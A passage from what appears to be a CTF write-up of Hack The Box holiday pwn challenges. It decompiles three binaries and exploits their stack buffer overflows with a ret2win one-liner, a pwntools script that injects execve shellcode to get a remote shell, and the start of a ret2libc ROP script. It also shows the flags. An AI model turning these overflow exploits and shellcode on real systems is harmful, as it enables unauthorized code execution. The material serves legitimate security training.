    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\x1b</span><span class="s">[1;31m"</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Mission failed!"</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Looking carefully, we see that there is a <code class="language-plaintext highlighter-rouge">read()</code> call that reads <code class="language-plaintext highlighter-rouge">0x108</code> or <code class="language-plaintext highlighter-rouge">264</code> bytes into a buffer of <code class="language-plaintext highlighter-rouge">64</code> bytes. This means we can write beyond the boundaries of the buffer and overwrite the return address stored in the stack.</p><p>Another observation that was made is that there was another unused function called <code class="language-plaintext highlighter-rouge">deactivate_camera()</code>.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>
<span class="kt">void</span> <span class="nf">deactivate_camera</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
    <span class="kt">char</span> <span class="n">acStack104</span> <span class="p">[</span><span class="mi">48</span><span class="p">];</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">local_38</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">local_30</span><span class="p">;</span>
    <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
    
    <span class="n">local_1c</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
    <span class="n">local_28</span> <span class="o">=</span> <span class="mh">0x2f</span><span class="p">;</span>
    <span class="n">local_30</span> <span class="o">=</span> <span class="n">acStack104</span><span class="p">;</span>
    <span class="n">local_38</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fwrite</span><span class="p">(</span><span class="s">"[-] Could not open flag.txt, please conctact an Administrator.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
        <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mh">0x45</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">local_30</span><span class="p">,</span><span class="n">local_1c</span><span class="p">,</span><span class="n">local_38</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\x1b</span><span class="s">[1;32m"</span><span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="s">"[+] Here is the secret password to deactivate the camera: "</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">local_38</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Judging from this, we can probably guess that we are supposed to jump to this function to retrieve the flag. Getting its address is as simple as running <code class="language-plaintext highlighter-rouge">objump -d mrsnowy</code>.</p><p>With a bit of fiddling around with back-to-back <code class="language-plaintext highlighter-rouge">python</code> commands to generate my payload and <code class="language-plaintext highlighter-rouge">dmesg</code> to check the resultant contents of the instruction pointer, here was the final command that achieved the desired result:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 <span class="nt">-c</span> <span class="s1">'print("1\n" + "A"*72 + "\x65\x11\x40\x00",end="")'</span> | nc 206.189.19.177 30077
</pre></table></code></div></div><p>To break it down, the <code class="language-plaintext highlighter-rouge">"1\n"</code> allows to us first specify that we want to investigate the snowman, followed by <code class="language-plaintext highlighter-rouge">"A"*72"</code> to fill the buffer and allow us to reach to the stored return address. Finally, we add the address of the <code class="language-plaintext highlighter-rouge">deactivate_camera()</code> function in reverse order.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta4.png" alt="" /></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}</code></p><h2 id="sleigh-day-2">Sleigh (Day 2)</h2><blockquote><p>The Elves have messed up with Santa’s sleigh! Without it, he will not be able to deliver any gifts!! Help him repair it and save the holidays!<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">pwn_sleigh.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">pwn_sleigh.zip</code> was a binary <code class="language-plaintext highlighter-rouge">sleigh</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta12.png" alt="" /></p><p>The program first asks if you want to <code class="language-plaintext highlighter-rouge">Repair</code> or <code class="language-plaintext highlighter-rouge">Abandon</code> the sleigh. Choosing <code class="language-plaintext highlighter-rouge">Abandon</code> will simply terminate the program so I chose <code class="language-plaintext highlighter-rouge">Repair</code>.</p><p>The program then prints what seems to be the memory address of something. Opening the program in <code class="language-plaintext highlighter-rouge">Ghidra</code>, we see that the printing was done in <code class="language-plaintext highlighter-rouge">repair()</code>:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">repair</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">undefined8</span> <span class="n">local_48</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_40</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_20</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_18</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_28</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">"%s</span><span class="se">\n</span><span class="s">[!] There is something written underneath the sleigh: [%p]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00100c98</span><span class="p">,</span>
          <span class="o">&amp;</span><span class="n">local_48</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">"%s[*] This might help the repair team to fix it. What shall they do?</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">,</span>
          <span class="o">&amp;</span><span class="n">DAT_00100ca8</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0xa4</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00102150</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00100ca0</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>From the code, we see that it is printing the address of <code class="language-plaintext highlighter-rouge">local_48</code>. Following that, we see a <code class="language-plaintext highlighter-rouge">read()</code> call that reads <code class="language-plaintext highlighter-rouge">0xa4</code> or <code class="language-plaintext highlighter-rouge">164</code> bytes into <code class="language-plaintext highlighter-rouge">local_48</code>, which is a buffer of 8 bytes. This meant that we could feed enough bytes to overwrite the contents of <code class="language-plaintext highlighter-rouge">local_48</code>, as well as the other following 8-byte variables to reach the stored return address.</p><p>Making use of the ability to insert bytes at <code class="language-plaintext highlighter-rouge">local_48</code> using the <code class="language-plaintext highlighter-rouge">read()</code> call and the known address of <code class="language-plaintext highlighter-rouge">local_48</code> from the <code class="language-plaintext highlighter-rouge">fprintf()</code> call, we can:</p><p>1) Store shellcode at <code class="language-plaintext highlighter-rouge">local_48</code>.<br /> 2) Overwrite the stored return address with the address of <code class="language-plaintext highlighter-rouge">local_48</code> to jump to the shellcode.</p><p>With that said, let’s construct our script using <code class="language-plaintext highlighter-rouge">pwntools</code>. First we will need to calculate the offset to reach the stored return address.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./sleigh"</span><span class="p">)</span>

<span class="c1"># First prompt
</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># Second prompt
</span><span class="n">prompt</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># Get offset (Referenced from https://dev.to/hextrace/use-pwntools-for-your-exploits-40m3)
</span><span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
<span class="n">core</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">corefile</span>
<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">rsp</span>
<span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Offset:"</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./sleigh'</span>: pid 3489
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Process <span class="s1">'./sleigh'</span> stopped with <span class="nb">exit </span>code <span class="nt">-11</span> <span class="o">(</span>SIGSEGV<span class="o">)</span> <span class="o">(</span>pid 3489<span class="o">)</span>
<span class="o">[</span>+] Parsing corefile...: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/Downloads/core.3489'</span>
    Arch:      amd64-64-little
    RIP:       0x557de8200b99
    RSP:       0x7ffd742e6c18
    Exe:       <span class="s1">'/home/kali/Downloads/sleigh'</span> <span class="o">(</span>0x557de8200000<span class="o">)</span>
    Fault:     0x6161617461616173
Offset: 72
</pre></table></code></div></div><p>After getting the offset of 72 bytes, we can now retrieve the address of <code class="language-plaintext highlighter-rouge">local_48</code>:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./sleigh"</span><span class="p">)</span>

<span class="c1"># First prompt
</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># Second prompt
</span><span class="n">prompt</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>

<span class="c1"># Get leaked address of local_48
</span><span class="n">address</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"\[(0x.*?)\]"</span><span class="p">,</span> <span class="n">prompt1</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))</span>             
</pre></table></code></div></div><p>Now lets put together everything and add the shellcode from <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">here</a>.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./sleigh"</span><span class="p">)</span>

<span class="c1"># First prompt
</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># Second prompt
</span><span class="n">prompt</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>

<span class="c1"># Get leaked address of local_48
</span><span class="n">address</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"\[(0x.*?)\]"</span><span class="p">,</span> <span class="n">prompt</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))</span> 

<span class="c1"># From http://shell-storm.org/shellcode/files/shellcode-806.php
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s">"</span>

<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">address</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./sleigh'</span>: pid 3636
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
                                                                                                                                                        
<span class="o">[</span>-] Unfortunately, the sleigh could not be repaired! 😥                                                                                                 
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span>,20<span class="o">(</span>dialout<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>,118<span class="o">(</span>bluetooth<span class="o">)</span>,120<span class="o">(</span>wireshark<span class="o">)</span>,123<span class="o">(</span>kali-trusted<span class="o">)</span>,134<span class="o">(</span>scanner<span class="o">)</span>,142<span class="o">(</span>kaboxer<span class="o">)</span>,998<span class="o">(</span>docker<span class="o">)</span>
</pre></table></code></div></div><p>Great! We managed to spawn a shell. Now lets replace the process with a network connection to their service.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="c1"># p = process("./sleigh")
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"206.189.24.71"</span><span class="p">,</span> <span class="mi">31050</span><span class="p">)</span>

<span class="c1"># First prompt
</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># Second prompt
</span><span class="n">prompt</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>

<span class="c1"># Get leaked address of local_48
</span><span class="n">address</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"\[(0x.*?)\]"</span><span class="p">,</span> <span class="n">prompt</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))</span> 

<span class="c1"># From http://shell-storm.org/shellcode/files/shellcode-806.php
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s">"</span>

<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">address</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Opening connection to 206.189.24.71 on port 31050: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
                                                                                                                                                        
<span class="o">[</span>-] Unfortunately, the sleigh could not be repaired! 😥                                                                                                 
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span>
<span class="nv">$ </span><span class="nb">ls
</span>flag.txt  sleigh
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
HTB<span class="o">{</span>d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!<span class="o">}</span>
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!}</code></p><h2 id="naughty-list-day-3">Naughty List (Day 3)</h2><blockquote><p>The Elves have stolen Santa’s 📜 and now he does not know who was good and who was bad. This form will help him recreate his list and send out gifts. Were you good enough or naughty?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">pwn_naughty_list.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">pwn_naughty_list.zip</code> was a binary <code class="language-plaintext highlighter-rouge">naughty_list</code> and <code class="language-plaintext highlighter-rouge">libc.so.6</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./naughty_list                                                                                                                                                   130 ⨯

~ Ho Ho Ho Santa is here ~

       _______________
    <span class="nv">0</span><span class="o">==(</span> Naughty List <span class="o">(</span><span class="nv">c</span><span class="o">==</span>0
       <span class="s1">'______________'</span>|
         | Name        |
         | Gift        |
       __<span class="o">)</span>_____________|
   <span class="nv">0</span><span class="o">==(</span>               <span class="o">(</span><span class="nv">c</span><span class="o">==</span>0
       <span class="s1">'--------------'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enter your name    <span class="o">(</span>letters only<span class="o">)</span>: rizemon
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enter your surname <span class="o">(</span>letters only<span class="o">)</span>: rizemon
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enter your age <span class="o">(</span>18-120<span class="o">)</span>: 19

<span class="o">[</span>+] Name:    <span class="o">[</span>RIZEMON]
<span class="o">[</span>+] Surname: <span class="o">[</span>RIZEMON]
<span class="o">[</span>+] Age:     <span class="o">[</span>19]

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Name of the gift you want and why you were good enough to deserve it: rizemon

<span class="o">[</span><span class="k">*</span><span class="o">]</span> 🎅 will take a better look and hopefuly you will get your 🎁!
</pre></table></code></div></div><p>Lets run <code class="language-plaintext highlighter-rouge">checksec</code> to understanding the protections in place.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>checksec <span class="nt">--file</span><span class="o">=</span>naughty_list     
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   88<span class="o">)</span> Symbols       No    0               3               naughty_list
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">NX</code> was enabled, meaning our stack is marked as non-executable. Lets open it up in <code class="language-plaintext highlighter-rouge">Ghidra</code>.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">get_descr</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
    <span class="n">undefined</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    
    <span class="n">rainbow</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Name of the gift you want and why you were good enough to deserve it: "</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_28</span><span class="p">,</span><span class="mh">0x3c0</span><span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00401688</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Jumping straight to the function that was handling the input of the name of the gift, we see a <code class="language-plaintext highlighter-rouge">read()</code> call that reads <code class="language-plaintext highlighter-rouge">0x3c0</code> or <code class="language-plaintext highlighter-rouge">960</code> bytes into <code class="language-plaintext highlighter-rouge">local_28</code>, a buffer of 32 bytes. This meant we can enter enough bytes to write past this buffer and overwrite the return address stored in the stack and allow us to jump to anywhere.</p><p>Because the stack is labelled as non-executable, we can jump to a function in libc instead, possibly one that executes commands like <code class="language-plaintext highlighter-rouge">system()</code> or <code class="language-plaintext highlighter-rouge">execve()</code>.</p><p>For some reason, I wasn’t able to use <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> to load the provided <code class="language-plaintext highlighter-rouge">libc.so.6</code> but it will come in useful when we interact with the exposed remote service.</p><p>To identify where the libc is, we can make use of <code class="language-plaintext highlighter-rouge">puts</code> to write the address of the <code class="language-plaintext highlighter-rouge">puts</code> function to <code class="language-plaintext highlighter-rouge">stdout</code>. From there, we can calculate where libc exists in the memory.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1"># Found by running `ldd naughty_list`
</span><span class="n">libc_file</span> <span class="o">=</span> <span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span>
<span class="c1"># libc_file = "./libc.so.6"
</span>
<span class="n">elf_file</span> <span class="o">=</span> <span class="s">"./naughty_list"</span>

<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_file</span><span class="p">)</span>
<span class="n">ELF_LOADED</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf_file</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./naughty_list"</span><span class="p">)</span>
<span class="c1"># p = remote("138.68.183.216", 31886)
</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">ELF_LOADED</span><span class="p">)</span>

<span class="n">PUTS_GOT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>

